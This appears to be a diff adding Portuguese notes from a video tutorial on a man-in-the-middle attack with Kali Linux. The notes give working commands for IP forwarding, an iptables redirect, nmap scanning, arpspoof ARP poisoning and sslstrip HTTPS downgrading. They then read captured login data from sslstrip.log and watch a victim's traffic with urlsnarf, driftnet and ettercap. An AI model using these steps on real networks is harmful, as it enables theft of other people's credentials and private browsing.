@@ -1,0 +1,71 @@
+kali usado 1- no diretório root@kali~# apenas
+
+ifconfig
+
+selecione uma interface no video ele usa eth0(cabo)
+mas testaremos com wlan0 depois... inicialmente vamos tentar eth0
+Ja esteja conectado a iternet antes de iniciar o ataque.
+
+no mesmo terminal
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+route -n
+
+copie o ip abaixo da palavra gateway
+
+nmap -sS -O ipcopiado/24 ou nmap -T4 -A -v ipgateway(0-255)
+
+observar se após o scan a primeira ocorrencia do item exibe "nmap scan report for ipcopiado"
+e o observar também se o segundo item do nmap scan report exibe o ip de uma segunda maquina 
+além da própria gateway. Se sim copie este ip do segundo item (suspeito que seja o ipalvo)
+
+clear
+
+arpspoof -i <interface> -t ipalvo ipgatewy
+(tem que ficar descendo umas letras contendo macs de ambos is-at
+e 0806 arp reply) 
+
+ctrl+shift+n
+
+sslstrip -l 10000
+
+Maquina vítima
+
+nesse momento abrir o navegador...
+observar os endereços de sites https mudando para http...
+ver também se ouver problema mudar o navegador...
+
+observe a movimentação do segundo terminal do ssl
+
+veja os resultados novo terminal
+ctrl+shift+n
+
+cat sslstrip.log
+
+esse ultimo comando acima testa se o navegdor esta vulnerável
+se estiver mostra os dados de login ou até de navegação...
+caso não mostra que esta tudo criptografado.
+
+sysctl -w net.ipv4.ip_forward-1
+
+ettercap assume....
+
+urlsnarf -i wlan0 (mostra os sites que estao sendo acessados pela vitima)
+
+driftnet -i wlan0 -d /home/user/Desktop/ -vv 
+(Exibe imagens, para salvar clique duas vezes na imagem da janela)
+
+ettercap -T -q -i wlan0 -M arp:remote /gateway/ /vitima/ (ou // // toda rede)
+
+
+FONTE: https://www.youtube.com/watch?v=3RzpdkwuAZo
+
+SSLSTRIP 2.0
+
+https://www.guiadoti.com/2017/09/sslstrip-2-0-hsts-bypass/
+
+
+
